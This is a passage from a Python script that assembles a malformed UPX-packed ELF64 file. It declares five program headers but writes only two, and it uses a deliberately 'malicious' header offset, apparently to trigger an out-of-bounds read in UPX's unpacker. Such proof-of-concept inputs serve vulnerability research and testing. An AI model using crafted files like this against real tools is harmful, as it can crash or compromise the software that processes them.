ensures the buffer is sized for 5, but only 2 are readable\npacked_phdrs = bytearray(56 * 2)  # Only 2 phdrs, but claim 5!\n\nfor i in range(2):\n    offset = i * 56\n    struct.pack_into(\'<I\', packed_phdrs, offset + 0, 1)  # PT_LOAD\n    struct.pack_into(\'<I\', packed_phdrs, offset + 4, 5)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 8, i * 0x1000)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 16, 0x400000 + i * 0x1000)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 24, 0x400000 + i * 0x1000)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 32, 0x1000)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 40, 0x1000)\n    struct.pack_into(\'<Q\', packed_phdrs, offset + 48, 0x1000)\n\n# Step 4: Create UPX metadata structures\n# l_info (12 bytes)\nl_info = bytearray(12)\nstruct.pack_into(\'<I\', l_info, 0, 12)  # l_size\nstruct.pack_into(\'<B\', l_info, 2, 0)   # l_version\nstruct.pack_into(\'<B\', l_info, 3, 0x0d)  # l_format = UPX_F_LINUX_ELF64\n\n# p_info (12 bytes)\np_info = bytearray(12)\nstruct.pack_into(\'<I\', p_info, 0, 0x3000)  # p_progid\nstruct.pack_into(\'<I\', p_info, 4, 0x2000)  # p_filesize\nstruct.pack_into(\'<I\', p_info, 8, len(orig_data) + 0x1000)  # p_blocksize\n\n# b_info (12 bytes)\nb_info = bytearray(12)\nstruct.pack_into(\'<I\', b_info, 0, len(orig_data))  # sz_unc\nstruct.pack_into(\'<I\', b_info, 4, len(compressed_data))  # sz_cpr\nstruct.pack_into(\'<B\', b_info, 8, 8)  # b_method = M_NRV2B_LE32\nstruct.pack_into(\'<B\', b_info, 9, 0)  # b_ftid\nstruct.pack_into(\'<B\', b_info, 10, 0)  # b_cto8\n\n# Step 5: Assemble the packed file\n# Layout: [ELF header] [padding to e_phoff] [2 phdrs] [more data] [l_info] [p_info] [b_info] [compressed]\n\nfile_data = bytearray()\nfile_data.extend(packed_ehdr)\n\n# Pad to reach e_phoff\npadding1 = e_phoff_malicious - len(file_data)\nif padding1 > 0:\n    file_data.extend(b\'\\x00\' * padding1)\n\n# Add the 2 program headers (but we claimed 5!)\nfile_data.extend(packed_phdrs)\n\n#